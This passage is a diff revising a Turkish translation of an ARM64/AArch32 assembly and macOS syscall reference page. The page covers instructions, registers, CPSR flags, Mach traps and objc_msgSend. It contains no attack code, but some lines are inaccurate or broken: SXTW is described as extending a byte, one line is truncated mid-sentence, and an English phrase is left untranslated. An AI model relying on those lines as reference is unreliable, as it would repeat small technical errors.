-- **`SBFIZ X1, X2, #3, #4`** X2'den 4 bit'i sign-extend eder ve sağ bitleri sıfırlayarak bit position 3'ten başlayacak şekilde X1'e yerleştirir.
-- **`SBFX X1, X2, #3, #4`** X2'den bit 3'ten başlayan 4 bit'i çıkarır, sign-extend eder ve sonucu X1'e yerleştirir.
-- **`UBFIZ X1, X2, #3, #4`** X2'den 4 bit'i zero-extend eder ve sağ bitleri sıfırlayarak bit position 3'ten başlayacak şekilde X1'e yerleştirir.
-- **`UBFX X1, X2, #3, #4`** X2'den bit 3'ten başlayan 4 bit'i çıkarır ve zero-extend edilmiş sonucu X1'e yerleştirir.
-- **Sign Extend To X:** Bir değer üzerinde operation gerçekleştirebilmek için değer'in sign'ını (unsigned sürümde yalnızca 0'lar ekleyerek) genişletir:
-- **`SXTB X1, W2`** 64 bit'i doldurmak için **W2'deki bir byte'ın sign'ını W2'den X1'e** genişletir (`W2`, `X2`'nin yarısıdır).
-- **`SXTH X1, W2`** 64 bit'i doldurmak için W2'deki 16-bit sayının sign'ını W2'den X1'e genişletir.
-- **`SXTW X1, W2`** 64 bit'i doldurmak için W2'deki bir byte'ın sign'ını W2'den X1'e genişletir.
-- **`UXTB X1, W2`** 64 bit'i doldurmak için W2'deki bir byte'a (unsigned) 0'lar ekler ve X1'e yerleştirir.
-- **`extr`:** Belirtilen **birleştirilmiş register çifti** içinden bit'leri çıkarır.
+- **Bitfield Extract and Insert:** Bir register'dan bitfield kopyalar ve başka bir register'a kopyalar.
+- **`BFI X1, X2, #3, #4`** X2'den 4 biti alır ve X1'deki 3. bitten başlayarak yerleştirir
+- **`BFXIL X1, X2, #3, #4`** X2'nin 3. bitinden dört bit çıkarır ve bunları X1'e kopyalar
+- **`SBFIZ X1, X2, #3, #4`** X2'den 4 biti sign-extend eder ve sağ bitleri sıfırlayarak bit position 3'ten başlayarak X1'e yerleştirir
+- **`SBFX X1, X2, #3, #4`** X2'de bit 3'ten başlayan 4 biti çıkarır, sign-extend eder ve sonucu X1'e yerleştirir
+- **`UBFIZ X1, X2, #3, #4`** X2'den 4 biti zero-extend eder ve sağ bitleri sıfırlayarak bit position 3'ten başlayarak X1'e yerleştirir
+- **`UBFX X1, X2, #3, #4`** X2'de bit 3'ten başlayan 4 biti çıkarır ve zero-extend edilmiş sonucu X1'e yerleştirir.
+- **Sign Extend To X:** Bir değer üzerinde operation gerçekleştirebilmek için sign'ı (veya unsigned sürümde yalnızca 0'lar ekleyerek) genişletir:
+- **`SXTB X1, W2`** 64 bit'i doldurmak için **W2'deki bir byte'ın sign'ını W2'den X1'e** genişletir (`W2`, `X2`'nin yarısıdır)
+- **`SXTH X1, W2`** 64 bit'i doldurmak için **W2'deki 16-bit sayının sign'ını W2'den X1'e** genişletir
+- **`SXTW X1, W2`** 64 bit'i doldurmak için **W2'deki bir byte'ın sign'ını W2'den X1'e** genişletir
+- **`UXTB X1, W2`** 64 bit'i doldurmak için **W2'deki bir byte'a 0'lar (unsigned) ekleyerek W2'den X1'e** taşır
+- **`extr`:** Belirtilen **birleştirilmiş register çifti** içinden bitleri çıkarır.
 - Örnek: `EXTR W3, W2, W1, #3` **W1+W2'yi birleştirir**, W2'nin 3. bitinden W1'in 3. bitine kadar olan kısmı alır ve W3'e kaydeder.
-- **`cmp`**: İki register'ı **karşılaştırır** ve condition flag'lerini ayarlar. Destination register'ı zero register'a ayarlayan bir **`subs` alias'ıdır**. `m == n` durumunu öğrenmek için kullanışlıdır.
-- **`subs` ile aynı syntax'ı** destekler.
-- Örnek: `cmp x0, x1` — x0 ve x1 değerlerini karşılaştırır ve condition flag'lerini buna göre ayarlar.
-- **`cmn`**: **Compare negative** operand. Bu durumda **`adds` alias'ıdır** ve aynı syntax'ı destekler. `m == -n` durumunu öğrenmek için kullanışlıdır.
-- **`ccmp`**: Conditional comparison; yalnızca önceki comparison doğruysa gerçekleştirilen ve nzcv bit'lerini belirli biçimde ayarlayan bir comparison'dır.
-- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> x1 != x2 ve x3 < x4 ise func'a atlar.
-- Bunun nedeni **`ccmp`'nin yalnızca önceki `cmp` bir `NE` olduğunda çalıştırılmasıdır**; değilse `nzcv` bit'leri 0'a ayarlanır ve bu durum **`blt` comparison'ını** karşılamaz.
+- **`cmp`**: İki register'ı **karşılaştırır** ve condition flag'lerini ayarlar. Destination register'ını zero register'a ayarlayan bir **`subs` alias**'ıdır. `m == n` durumunu öğrenmek için kullanışlıdır.
+- **`subs`** ile aynı syntax'ı destekler
+- Örnek: `cmp x0, x1` — `x0` ve `x1` değerlerini karşılaştırır ve condition flag'lerini uygun şekilde ayarlar.
+- **`cmn`**: **Compare negative** operand. Bu durumda **`adds` alias**'ıdır ve aynı syntax'ı destekler. `m == -n` durumunu öğrenmek için kullanışlıdır.
+- **`ccmp`**: Conditional comparison; yalnızca önceki comparison doğruysa gerçekleştirilen ve nzcv bit'lerini özel olarak ayarlayan bir comparison'dır.
+- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> x1 != x2 ve x3 < x4 ise func'a atlar
+- Bunun nedeni, **`ccmp`**'nin yalnızca **önceki `cmp` bir `NE` ise** çalıştırılmasıdır; değilse `nzcv` bit'leri 0 olarak ayarlanır (bu da `blt` comparison'ını karşılamaz).
 - Bu işlem `ccmn` olarak da kullanılabilir (`cmp` ile `cmn` arasındaki fark gibi, ancak negative).
-- **`tst`**: Comparison değerlerinden herhangi birinin ikisinin de 1 olup olmadığını kontrol eder (sonucu hiçbir yere kaydetmeden ANDS gibi çalışır). Bir register'ı bir değerle kontrol etmek ve değerde belirtilen register bit'lerinden herhangi birinin 1 olup olmadığını öğrenmek için kullanışlıdır.
-- Örnek: `tst X1, #7` X1'in son 3 bit'inden herhangi birinin 1 olup olmadığını kontrol eder.
-- **`teq`**: Sonucu discarded edilen XOR operation'ı.
-- **`b`**: Unconditional Branch.
+- **`tst`**: Comparison değerlerinden herhangi ikisinin de 1 olup olmadığını kontrol eder (sonucu hiçbir yere kaydetmeden ANDS gibi çalışır). Bir register'ı bir değerle kontrol etmek ve değerde belirtilen register bit'lerinden herhangi birinin 1 olup olmadığını öğrenmek için kullanışlıdır.
+- Örnek: `tst X1, #7` X1'in son 3 bitinden herhangi birinin 1 olup olmadığını kontrol eder
+- **`teq`**: Sonucu discard ederek XOR operation'ı gerçekleştirir
+- **`b`**: Unconditional Branch
 - Örnek: `b myFunction`
-- Bunun link register'ı return address ile doldurmayacağını unutmayın (geri dönmesi gereken subroutine call'ları için uygun değildir).
-- **`bl`**: Link içeren **Branch**; bir **subroutine'i çağırmak** için kullanılır. **Return address'i `x30` içinde saklar**.
-- Örnek: `bl myFunction` — `myFunction` function'ını çağırır ve return address'i `x30` içinde saklar.
-- Bunun link register'ı return address ile doldurmayacağını unutmayın (geri dönmesi gereken subroutine call'ları için uygun değildir).
-- **`blr`**: Link to Register içeren **Branch**; target'ın bir **register'da belirtildiği** **subroutine'i çağırmak** için kullanılır. Return address'i `x30` içinde saklar.
-- Örnek: `blr x1` — address'i x1'de bulunan function'ı çağırır ve return address'i x30'da saklar.
-- **`ret`**: Genellikle **`x30`** içindeki address'i kullanarak **subroutine'den return** eder.
-- Örnek: `ret` — current subroutine'den x30'daki return address'i kullanarak döner.
-- **`b.<cond>`**: Conditional branch'ler.
+- Bunun link register'ını return address ile doldurmayacağını unutmayın (geri dönmesi gereken subroutine call'ları için uygun değildir)
+- **`bl`**: Link ile **Branch**; bir **subroutine**'i **çağırmak** için kullanılır. **Return address'i `x30`** içine kaydeder.
+- Örnek: `bl myFunction` — `myFunction` function'ını çağırır ve return address'i `x30` içine kaydeder.
+- Bunun link register'ını return address ile doldurmayacağını unutmayın (geri dönmesi gereken subroutine call'ları için uygun değildir)
+- **`blr`**: Link to Register ile **Branch**; target'ın bir **register**'da belirtildiği bir **subroutine**'i **çağırmak** için kullanılır. Return address'i `x30` içine kaydeder. (Bu
+- Örnek: `blr x1` — address'i `x1` içinde bulunan function'ı çağırır ve return address'i `x30` içine kaydeder.
+- **`ret`**: Genellikle **`x30`** içindeki address'i kullanarak **subroutine**'den **return** eder.
+- Örnek: `ret` — `x30` içindeki return address'i kullanarak current subroutine'den return eder.
+- **`b.<cond>`**: Conditional branch'ler
 - **`b.eq`**: Önceki `cmp` instruction'ına göre **eşitse branch** eder.
 - Örnek: `b.eq label` — Önceki `cmp` instruction'ı iki eşit değer bulduysa `label`'a atlar.
-- **`b.ne`**: **Not Equal ise Branch**. Bu instruction condition flag'lerini (önceki bir comparison instruction'ı tarafından ayarlanmış) kontrol eder ve karşılaştırılan değerler eşit değilse bir label veya address'e branch eder.
-- Örnek: `cmp x0, x1` instruction'ından sonra `b.ne label` — x0 ve x1'deki değerler eşit değilse `label`'a atlar.
-- **`cbz`**: **Compare and Branch on Zero**. Bir register'ı zero ile karşılaştırır; eşitse bir label veya address'e branch eder.
-- Örnek: `cbz x0, label` — x0 değeri zero ise `label`'a atlar.
-- **`cbnz`**: **Compare and Branch on Non-Zero**. Bir register'ı zero ile karşılaştırır; eşit değilse bir label veya address'e branch eder.
-- Örnek: `cbnz x0, label` — x0 değeri non-zero ise `label`'a atlar.
-- **`tbnz`**: Bit'i test eder ve nonzero ise branch eder.
+- **`b.ne`**: **Eşit değilse Branch** eder. Bu instruction condition flag'lerini (önceki bir comparison instruction'ı tarafından ayarlanmıştır) kontrol eder ve karşılaştırılan değerler eşit değilse bir label veya address'e branch eder.
+- Örnek: `cmp x0, x1` instruction'ından sonra `b.ne label` — `x0` ve `x1` değerleri eşit değilse `label`'a atlar.
+- **`cbz`**: **Compare and Branch on Zero**. Bu instruction bir register'ı zero ile karşılaştırır; eşitse bir label veya address'e branch eder.
+- Örnek: `cbz x0, label` — `x0` değeri zero ise `label`'a atlar.
+- **`cbnz`**: **Compare and Branch on Non-Zero**. Bu instruction bir register'ı zero ile karşılaştırır; eşit değilse bir label veya address'e branch eder.
+- Örnek: `cbnz x0, label` — `x0` değeri zero değilse `label`'a atlar.
+- **`tbnz`**: Bit'i test eder ve nonzero ise branch eder
 - Örnek: `tbnz x0, #8, label`
-- **`tbz`**: Bit'i test eder ve zero ise branch eder.
+- **`tbz`**: Bit'i test eder ve zero ise branch eder
 - Örnek: `tbz x0, #8, label`
-- **Conditional select operation'ları**: Davranışları conditional bit'lere göre değişen operation'lardır.
+- **Conditional select operations**: Davranışları conditional bit'lere göre değişen operation'lardır.
 - `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Doğruysa X0 = X1, yanlışsa X0 = X2
 - `csinc Xd, Xn, Xm, cond` -> Doğruysa Xd = Xn, yanlışsa Xd = Xm + 1
 - `cinc Xd, Xn, cond` -> Doğruysa Xd = Xn + 1, yanlışsa Xd = Xn
@@ -217,35 +217,35 @@ ARM64 instruction'ları genel olarak **`opcode dst, src1, src2`** formatına sah
 - `cneg Xd, Xn, cond` -> Doğruysa Xd = - Xn, yanlışsa Xd = Xn
 - `cset Xd, Xn, Xm, cond` -> Doğruysa Xd = 1, yanlışsa Xd = 0
 - `csetm Xd, Xn, Xm, cond` -> Doğruysa Xd = \<all 1>, yanlışsa Xd = 0
-- **`adrp`**: Bir **symbol'ün page address'ini hesaplar** ve bir register'a kaydeder.
-- Örnek: `adrp x0, symbol` — `symbol`'ün page address'ini hesaplar ve x0'a kaydeder.
-- **`ldrsw`**: Memory'den signed **32-bit** değer yükler ve bunu **64** bit'e sign-extend eder. Yaygın SWITCH case'lerinde kullanılır.
-- Örnek: `ldrsw x0, [x1]` — x1'in gösterdiği memory location'dan signed 32-bit değer yükler, bunu 64 bit'e sign-extend eder ve x0'a kaydeder.
-- **`stur`**: Başka bir register'dan alınan offset'i kullanarak **bir register değerini memory location'a kaydeder**.
-- Örnek: `stur x0, [x1, #4]` — x0 değerini, x1'deki current address'ten 4 byte daha büyük olan memory address'ine kaydeder.
-- **`svc`**: **System call** gerçekleştirir. "Supervisor Call" anlamına gelir. Processor bu instruction'ı çalıştırdığında **user mode'dan kernel mode'a geçer** ve memory'de **kernel'ın system call handling** code'unun bulunduğu belirli bir konuma atlar.
+- **`adrp`**: Bir **symbol'ün page address**'ini hesaplar ve bir register'a kaydeder.
+- Örnek: `adrp x0, symbol` — `symbol`'ün page address'ini hesaplar ve `x0`'a kaydeder.
+- **`ldrsw`**: Memory'den signed **32-bit** bir değer **yükler** ve bunu **64** bit'e sign-extend eder. Yaygın SWITCH case'leri için kullanılır.
+- Örnek: `ldrsw x0, [x1]` — `x1` tarafından gösterilen memory location'dan signed 32-bit bir değer yükler, bunu 64 bit'e sign-extend eder ve `x0`'a kaydeder.
+- **`stur`**: Başka bir register'dan alınan offset'i kullanarak bir register değerini bir memory location'a **kaydeder**.
+- Örnek: `stur x0, [x1, #4]` — `x0` içindeki değeri, current `x1` address'inden 4 byte daha büyük olan memory address'e kaydeder.
+- **`svc`**: **System call** gerçekleştirir. "Supervisor Call" ifadesinin kısaltmasıdır. Processor bu instruction'ı çalıştırdığında **user mode'dan kernel mode'a geçer** ve **kernel'ın system call handling** code'unun bulunduğu memory'deki belirli bir konuma atlar.
 
 - Örnek:
 
 ```armasm
-mov x8, 93  ; exit için system call number'ı (93) x8 register'ına yükle.
-mov x0, 0   ; exit status code'unu (0) x0 register'ına yükle.
-svc 0       ; System call gerçekleştir.
+mov x8, 93  ; Load the system call number for exit (93) into register x8.
+mov x0, 0   ; Load the exit status code (0) into register x0.
+svc 0       ; Make the system call.
 ```
 
 ### **Function Prologue**
 
-1. **Link register ve frame pointer'ı stack'e kaydetme**:
+1. **Link register'ı ve frame pointer'ı stack'e kaydetme**:
 ```armasm
 stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
 ```
-2. **Yeni frame pointer'ı ayarlayın**: `mov x29, sp` (mevcut function için yeni frame pointer'ı ayarlar)
-3. **Local variable'lar için stack üzerinde alan ayırın** (gerekiyorsa): `sub sp, sp, <size>` (`<size>`, gereken byte sayısıdır)
+2. **Yeni frame pointer'ı ayarlama**: `mov x29, sp` (mevcut function için yeni frame pointer'ı ayarlar)
+3. **Local variable'lar için stack üzerinde alan ayırma** (gerekiyorsa): `sub sp, sp, <size>` (`<size>` gereken byte sayısıdır)
 
-### **Function Sonlandırma Bölümü**
+### **Function Epilogue**
 
-1. **Local variable'lar için ayrılan alanı serbest bırakın** (alan ayrıldıysa): `add sp, sp, <size>`
-2. **Link register'ı ve frame pointer'ı geri yükleyin**:
+1. **Local variable'lar için ayrılan alanı serbest bırakma**: `add sp, sp, <size>`
+2. **Link register'ı ve frame pointer'ı geri yükleme**:
 ```armasm
 ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
 ```
@@ -257,14 +257,14 @@ ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment th
 ../../../binary-exploitation/ios-exploiting/README.md
 {{#endref}}
 
-## AARCH32 Execution State
+## AARCH32 Çalışma Durumu
 
-Armv8-A, 32-bit programların çalıştırılmasını destekler. **AArch32**, **iki instruction set**'ten biriyle çalışabilir: **`A32`** ve **`T32`**; bunlar arasında **`interworking`** aracılığıyla geçiş yapılabilir.\
-**Privileged** 64-bit programlar, daha düşük ayrıcalıklı 32-bit **exception level**'a bir exception level transfer gerçekleştirerek **32-bit** programların **execution**'ını planlayabilir.\
-64-bit'ten 32-bit'e geçişin exception level'ın düşürülmesiyle gerçekleştiğine dikkat edin (örneğin EL1'deki 64-bit bir programın EL0'da bir programı tetiklemesi). Bu işlem, **`AArch32`** process thread'i çalıştırılmaya hazır olduğunda **`SPSR_ELx`** özel register'ının **4. bitinin** **1** olarak ayarlanmasıyla gerçekleştirilir; `SPSR_ELx`'in geri kalanı ise **`AArch32`** programının CPSR'ını saklar. Ardından privileged process, processor'ın **`AArch32`**'e geçmesini ve CPSR**'a bağlı olarak A32 veya T32'ye girmesini sağlamak için **`ERET`** instruction'ını çağırır.**
+Armv8-A, 32-bit programların çalıştırılmasını destekler. **AArch32**, **`A32`** ve **`T32`** olmak üzere **iki instruction set'ten** birinde çalışabilir ve bunlar arasında **`interworking`** aracılığıyla geçiş yapabilir.\
+**Privileged** 64-bit programlar, daha düşük yetkili 32-bit **exception level'a** geçiş gerçekleştirerek **32-bit programların çalıştırılmasını** planlayabilir.\
+64-bit'ten 32-bit'e geçişin exception level'ın düşürülmesiyle gerçekleştiğine dikkat edin (örneğin EL1'deki 64-bit bir programın EL0'da bir programı tetiklemesi). Bu işlem, **`AArch32`** process thread'i çalıştırılmaya hazır olduğunda **`SPSR_ELx`** özel register'ının **4. bitinin** **1** olarak ayarlanmasıyla gerçekleştirilir; `SPSR_ELx`'in geri kalanı ise **`AArch32`** programının CPSR'sini saklar. Ardından privileged process, processor'ın **`AArch32`**'e geçmesini ve CPSR**'ye bağlı olarak A32 veya T32'ye girmesini sağlamak için **`ERET`** instruction'ını çağırır.**
 
-**`interworking`**, CPSR'ın J ve T bitleri kullanılarak gerçekleştirilir. `J=0` ve `T=0`, **`A32`** anlamına gelir; `J=0` ve `T=1` ise **T32** anlamına gelir. Bu, instruction set'in T32 olduğunu belirtmek için temel olarak **en düşük bitin 1 olarak ayarlanması** anlamına gelir.\
-Bu ayarlama **interworking branch instructions** sırasında yapılır; ancak PC'nin destination register olarak ayarlandığı diğer instruction'larla da doğrudan yapılabilir. Örnek:
+**`interworking`**, CPSR'nin J ve T bitleri kullanılarak gerçekleşir. `J=0` ve `T=0`, **`A32`** anlamına gelir; `J=0` ve `T=1` ise **T32** anlamına gelir. Bu, instruction set'in T32 olduğunu belirtmek için temel olarak **en düşük bitin 1 olarak ayarlanması** şeklinde ifade edilir.\
+Bu ayarlama **`interworking` branch instruction'ları** sırasında yapılır; ancak PC'nin destination register olarak ayarlandığı diğer instruction'larla da doğrudan yapılabilir. Örnek:
 
 Başka bir örnek:
 ```armasm
@@ -279,7 +279,7 @@ mov r0, #8
 ```
 ### Registerler
 
-16 adet 32-bit register vardır (r0-r15). **r0'dan r14'e kadar** olanlar **herhangi bir işlem** için kullanılabilir; ancak bazıları genellikle ayrılmıştır:
+16 adet 32-bit register (`r0-r15`) bulunur. **`r0` ile `r14` arasındaki registerler** **herhangi bir işlem** için kullanılabilir; ancak bazıları genellikle ayrılmıştır:
 
 - **`r15`**: Program counter (her zaman). Bir sonraki instruction'ın adresini içerir. A32'de mevcut + 8, T32'de mevcut + 4.
 - **`r11`**: Frame Pointer
@@ -287,52 +287,52 @@ mov r0, #8
 - **`r13`**: Stack Pointer (Stack'in her zaman 16-byte hizalı olduğuna dikkat edin)
 - **`r14`**: Link Register
 
-Ayrıca register'lar, register değerlerini depolayan **`banked registries`** tarafından yedeklenir. Bunlar, exception handling ve privileged operations sırasında her seferinde register'ları manuel olarak kaydetme ve geri yükleme ihtiyacını ortadan kaldırarak **hızlı context switching** yapılmasını sağlar.\
-Bu işlem, **`CPSR` içindeki processor state'in**, exception'ın aktarıldığı processor mode'a ait **`SPSR`'ye kaydedilmesiyle** gerçekleştirilir. Exception'dan dönüşte **`CPSR`**, **`SPSR`'den** geri yüklenir.
+Ayrıca registerler, **`banked registries`** tarafından yedeklenir. Bunlar, exception handling ve privileged operations sırasında **hızlı context switching** gerçekleştirmeyi sağlayan register değerlerini depolayan alanlardır; böylece registerleri her seferinde manuel olarak kaydetme ve geri yükleme ihtiyacı ortadan kalkar.\
+Bu işlem, **`CPSR` içindeki processor state'in**, exception'ın alındığı processor mode'a ait **`SPSR`'ye kaydedilmesiyle** gerçekleştirilir. Exception'dan dönüldüğünde **`CPSR`**, **`SPSR`'den** geri yüklenir.
 
 ### CPSR - Current Program Status Register
 
-AArch32'de CPSR, AArch64'teki **`PSTATE`**'e benzer şekilde çalışır ve execution'ı daha sonra geri yüklemek üzere bir exception alındığında **`SPSR_ELx`** içinde de saklanır:
+AArch32'de CPSR, AArch64'teki **`PSTATE`** ile benzer şekilde çalışır ve execution'ı daha sonra geri yüklemek üzere bir exception alındığında **`SPSR_ELx`** içinde de saklanır:
 
 <figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>
 
-Alanlar birkaç gruba ayrılır:
+Alanlar bazı gruplara ayrılır:
 
-- Application Program Status Register (APSR): Arithmetic flags; EL0'dan erişilebilir.
+- Application Program Status Register (APSR): Arithmetic flags; EL0'dan erişilebilir
 - Execution State Registers: Process davranışı (OS tarafından yönetilir).
 
 #### Application Program Status Register (APSR)
 
 - **`N`**, **`Z`**, **`C`**, **`V`** flag'leri (AArch64'teki gibi)
-- **`Q`** flag'i: Specialized saturating arithmetic instruction'larının yürütülmesi sırasında **integer saturation gerçekleştiğinde** 1 olarak ayarlanır. **`1`** olarak ayarlandıktan sonra manuel olarak 0 yapılana kadar bu değeri korur. Ayrıca değerini implicit olarak kontrol eden herhangi bir instruction yoktur; değer manuel olarak okunmalıdır.
-- **`GE`** (Greater than or equal) flag'leri: "parallel add" ve "parallel subtract" gibi SIMD (Single Instruction, Multiple Data) operations içinde kullanılır. Bu operations, tek bir instruction içinde birden fazla data noktasının işlenmesini sağlar.
+- **`Q`** flag'i: Specialized saturating arithmetic instruction'ın execution'ı sırasında **integer saturation** gerçekleştiğinde 1 olarak ayarlanır. **`1`** olarak ayarlandıktan sonra manuel olarak 0'a ayarlanana kadar bu değeri korur. Ayrıca değerini implicit olarak kontrol eden herhangi bir instruction yoktur; manuel olarak okunması gerekir.
+- **`GE`** (Greater than or equal) flag'leri: "parallel add" ve "parallel subtract" gibi SIMD (Single Instruction, Multiple Data) operation'larında kullanılır. Bu operation'lar, tek bir instruction içinde birden fazla data noktasının işlenmesini sağlar.
 
-Örneğin **`UADD8`** instruction'ı, iki adet 32-bit operand'dan gelen **dört byte çiftini parallel olarak toplar** ve sonuçları bir 32-bit register'a kaydeder. Daha sonra bu sonuçlara göre **APSR içindeki `GE` flag'lerini** ayarlar. Her GE flag'i byte toplama işlemlerinden birine karşılık gelir ve ilgili byte çifti için yapılan toplamanın **overflow oluşturup oluşturmadığını** belirtir.
+Örneğin **`UADD8`** instruction'ı, iki adet 32-bit operand'dan **dört byte çiftini** parallel olarak toplar ve sonuçları bir 32-bit register'da saklar. Ardından bu sonuçlara göre **APSR içindeki `GE` flag'lerini ayarlar**. Her GE flag'i, byte toplama işlemlerinden birine karşılık gelir ve ilgili byte çiftinin toplamasında **overflow oluşup oluşmadığını** belirtir.
 
-**`SEL`** instruction'ı, conditional actions gerçekleştirmek için bu GE flag'lerini kullanır.
+**`SEL`** instruction'ı, koşullu işlemler gerçekleştirmek için bu GE flag'lerini kullanır.
 
 #### Execution State Registers
 
 - **`J`** ve **`T`** bit'leri: **`J`** 0 olmalıdır; **`T`** 0 ise A32 instruction set'i, 1 ise T32 kullanılır.
-- **IT Block State Register** (`ITSTATE`): Bunlar 10-15 ve 25-26 bit'leridir. **`IT`** ile prefix'lenmiş bir group içindeki instruction'ların koşullarını depolarlar.
-- **`E`** bit'i: **Endianness**'i belirtir.
-- **Mode and Exception Mask Bits** (0-4): Mevcut execution state'i belirler. 5. bit, programın 32-bit (1) veya 64-bit (0) olarak çalışıp çalışmadığını belirtir. Diğer 4 bit, o anda kullanılan **exception mode**'unu gösterir (bir exception oluştuğunda ve ele alındığında). Ayarlanan sayı, bu exception ele alınırken başka bir exception tetiklenmesi durumundaki **mevcut priority**'yi belirtir.
+- **IT Block State Register** (`ITSTATE`): Bunlar 10-15 ve 25-26. bitleridir. **`IT`** prefix'iyle başlayan bir grup içindeki instruction'ların koşullarını depolarlar.
+- **`E`** biti: **Endianness**'i belirtir.
+- **Mode and Exception Mask Bits** (0-4): Mevcut execution state'i belirler. **5. bit**, programın 32-bit (1) veya 64-bit (0) olarak çalışıp çalışmadığını belirtir. Diğer 4 bit, **şu anda kullanılan exception mode**'unu temsil eder (bir exception oluştuğunda ve işlenirken). Ayarlanan sayı, bu exception işlenirken başka bir exception tetiklenmesi durumundaki **mevcut priority**'yi belirtir.
 
 <figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>
 
-- **`AIF`**: Bazı exception'lar **`A`**, `I`, `F` bit'leri kullanılarak devre dışı bırakılabilir. **`A`** 1 ise **asynchronous aborts** tetiklenir. **`I`**, harici donanım **Interrupt Requests**'lerine (IRQ'lar) yanıt verilmesini yapılandırır ve F, **Fast Interrupt Requests** (FIR'ler) ile ilgilidir.
+- **`AIF`**: Bazı exception'lar **`A`**, `I`, `F` bit'leri kullanılarak devre dışı bırakılabilir. **`A`** 1 ise **asynchronous aborts** tetiklenir. **`I`**, harici donanım **Interrupt Requests**'lerine (IRQ'lar) yanıt verilmesini yapılandırır. `F` ise **Fast Interrupt Requests** (FIR'lar) ile ilgilidir.
 
 ## macOS
 
 ### BSD syscalls
 
-[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) dosyasına bakın veya `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h` komutunu çalıştırın. BSD syscalls **x16 > 0** değerine sahip olur.
+[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) dosyasına göz atın veya `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h` komutunu çalıştırın. BSD syscalls için **x16 > 0** olacaktır.
 
 ### Mach Traps
 
-[**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) içinde `mach_trap_table`'a ve [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) içinde prototype'lara bakın. Mach traps'in maksimum sayısı `MACH_TRAP_TABLE_COUNT` = 128'dir. Mach traps **x16 < 0** değerine sahip olur; bu nedenle önceki listedeki sayıları **eksi işaretiyle** çağırmanız gerekir: **`_kernelrpc_mach_vm_allocate_trap`**, **`-10`** değerine sahiptir.
+[**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) içinde `mach_trap_table`'a ve [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) içinde prototype'lara göz atın. Mach trap'lerinin max sayısı `MACH_TRAP_TABLE_COUNT` = 128'dir. Mach trap'lerinde **x16 < 0** olur; bu nedenle önceki listedeki sayıları **eksi** işaretiyle çağırmanız gerekir: **`_kernelrpc_mach_vm_allocate_trap`**, **`-10`** değerindedir.
 
-Bu ve BSD syscalls'lerin nasıl çağrıldığını bulmak için bir disassembler içinde **`libsystem_kernel.dylib`** dosyasını da inceleyebilirsiniz:
+Bu ve BSD syscalls'lerini nasıl çağıracağınızı görmek için bir disassembler'da **`libsystem_kernel.dylib`** dosyasını da inceleyebilirsiniz:
 ```bash
 # macOS
 dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e
@@ -340,32 +340,32 @@ dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Lib
 # iOS
 dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
 ```
-Bazen **Ida** ve **Ghidra**'nın da yalnızca cache'i geçirerek cache içindeki **specific dylibs**'leri decompile edebileceğini unutmayın.
+Note that **Ida** ve **Ghidra**, yalnızca cache'i geçirerek cache'ten **specific dylibs** dosyalarını da decompile edebilir.
 
 > [!TIP]
-> Bazen **`libsystem_kernel.dylib`** dosyasındaki **decompiled** kodu kontrol etmek, **source code**'u kontrol etmekten **daha kolaydır**; çünkü bazı syscall'ların (BSD ve Mach) kodu script'ler aracılığıyla oluşturulur (source code içindeki yorumları kontrol edin), dylib içinde ise neyin çağrıldığını görebilirsiniz.
+> Bazen **`libsystem_kernel.dylib`** dosyasındaki **decompiled** kodu kontrol etmek, **source code** kontrol etmekten **daha kolaydır**; çünkü bazı syscall'ların (BSD ve Mach) kodu script'ler aracılığıyla oluşturulur (source code içindeki yorumları kontrol edin), dylib içinde ise neyin çağrıldığını görebilirsiniz.
 
-### machdep çağrıları
+### machdep calls
 
-XNU, machine dependent olarak adlandırılan başka bir çağrı türünü de destekler. Bu çağrıların numaraları architecture'a bağlıdır ve ne çağrıların ne de numaraların sabit kalacağı garanti edilir.
+XNU, machine dependent olarak adlandırılan başka bir call türünü de destekler. Bu call'ların numaraları architecture'a bağlıdır ve ne call'ların ne de numaralarının sabit kalacağı garanti edilir.
 
 ### comm page
 
-Bu, her user process'in address space'ine map edilen, kernel tarafından sahip olunan bir memory page'dir. Amacı, çok sık kullanılan kernel service'leri için user mode'dan kernel space'e geçişi syscall kullanmaktan daha hızlı hâle getirmektir; aksi durumda bu geçiş çok verimsiz olurdu.
+Bu, kernel tarafından sahip olunan ve her user process'in address space'ine map edilen bir memory page'dir. Kernel service'leri için user mode'dan kernel space'e geçişi, bu geçişin çok verimsiz olacağı kadar sık kullanılan syscall'ları kullanmaktan daha hızlı hâle getirmek amacıyla tasarlanmıştır.
 
-Örneğin `gettimeofdate` çağrısı, `timeval` değerini doğrudan comm page'den okur.
+Örneğin `gettimeofdate` call'ı, `timeval` değerini doğrudan comm page'den okur.
 
 ### objc_msgSend
 
-Bu function'ı Objective-C veya Swift programlarında kullanılmış olarak bulmak oldukça yaygındır. Bu function, bir Objective-C object'in method'unu çağırmayı sağlar.
+Bu function'ı Objective-C veya Swift programlarında kullanılmış olarak görmek oldukça yaygındır. Bu function, bir Objective-C object'inin method'unu çağırmayı sağlar.
 
 Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):
 
